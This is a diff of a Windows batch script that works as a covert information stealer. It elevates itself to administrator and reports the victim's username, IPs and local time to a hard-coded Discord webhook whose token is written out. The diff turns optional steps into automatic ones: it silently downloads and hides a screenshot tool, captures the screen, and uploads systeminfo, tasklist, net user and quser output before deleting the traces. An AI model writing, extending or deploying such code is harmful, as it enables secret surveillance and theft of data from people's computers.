@@ -6,79 +6,43 @@ if not "%~dp0"=="%vpath%\" (
 	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 )
 :skipadministrator
-set "webhook=https://discord.com/api/webhooks/"
-
-:: GET PRIVATE IP ADDRESS
-:: ----------------------
+set "webhook=https://discord.com/api/webhooks/1257340049620598824/YTSubAWM7eHFgQEddmoTf0z0jyt1kOe1NA7nrJXFK3czkrDHJMuQ-fhnIQcZ8Sw_PoHG"
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
-
-:: GET PUBLIC IP ADDRESS
-:: ---------------------
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
-
-:: GET TIME
-:: --------
 for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 	set HH24=%%a
 	set MI=%%b
 )
-
-:: SEND FIRST REPORT MESSAGE WITH SOME INFO
-:: ----------------------------------------
 curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
+curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
+set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
+IF EXIST "s.exe" GOTO waitloop3
+curl --silent -L --fail "%ssurl%" -o s.exe
+>NUL attrib "%vpath%\s.exe" +h
+:waitloop3
+IF EXIST "s.exe" GOTO waitloopend3
+timeout /t 5 /nobreak > NUL
+:waitloopend3
+2> NUL s.exe -wh 1e9060a -o s.png
+curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
+2>NUL del "%vpath%\s.png"
+set "tempsys=%appdata%\sysinfo.txt"
+2>NUL SystemInfo > "%tempsys%"
+curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
+del "%tempsys%" >nul 2>&1
+set "temptasklist=%appdata%\tasklist.txt"
+2>NUL tasklist > "%temptasklist%"
+curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
+del "%temptasklist%" >nul 2>&1
+set "netuser=%appdata%\netuser.txt"
+2>NUL net user > "%netuser%"
+curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
+del "%netuser%" >nul 2>&1
+set "quser=%appdata%\quser.txt"
+2>NUL quser > "%quser%"
+curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
+del "%quser%" >nul 2>&1
 
-:: SCREENSHOT - REMOVE GOTO IF YOU WANT TO TAKE A SCREENSHOT WHEN RUN
-:: ------------------------------------------------------------------
-goto skipscreenshot
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot @ %HH24%:%MI%```\"}"  %webhook%
-	set "ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true"
-	IF EXIST "s.exe" GOTO waitloop3
-	curl --silent -L --fail "%ssurl%" -o s.exe
-	>NUL attrib "%vpath%\s.exe" +h
-	:waitloop3
-	IF EXIST "s.exe" GOTO waitloopend3
-	timeout /t 5 /nobreak > NUL
-	:waitloopend3
-	2> NUL s.exe -wh 1e9060a -o s.png
-	curl --silent --output /dev/null -F ss=@"%vpath%\s.png" %webhook%
-	2>NUL del "%vpath%\s.png"
-:skipscreenshot
-
-:: SYSTEM INFORMATION - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipsysteminfocapture
-	set "tempsys=%appdata%\sysinfo.txt"
-	2>NUL SystemInfo > "%tempsys%"
-	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
-	del "%tempsys%" >nul 2>&1
-:skipsysteminfocapture
-
-:: TASK LIST - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skiptasklist
-	set "temptasklist=%appdata%\tasklist.txt"
-	2>NUL tasklist > "%temptasklist%"
-	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
-	del "%temptasklist%" >nul 2>&1
-:skiptasklist
-
-:: NET USER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipnetuser
-	set "netuser=%appdata%\netuser.txt"
-	2>NUL net user > "%netuser%"
-	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
-	del "%netuser%" >nul 2>&1
-:skipnetuser
-
-:: QUSER - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
-:: ------------------------------------------------------------------
-goto skipquser
-	set "quser=%appdata%\quser.txt"
-	2>NUL quser > "%quser%"
-	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
-	del "%quser%" >nul 2>&1
-:skipquser
 
 :: STARTUP PROGRAMS - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
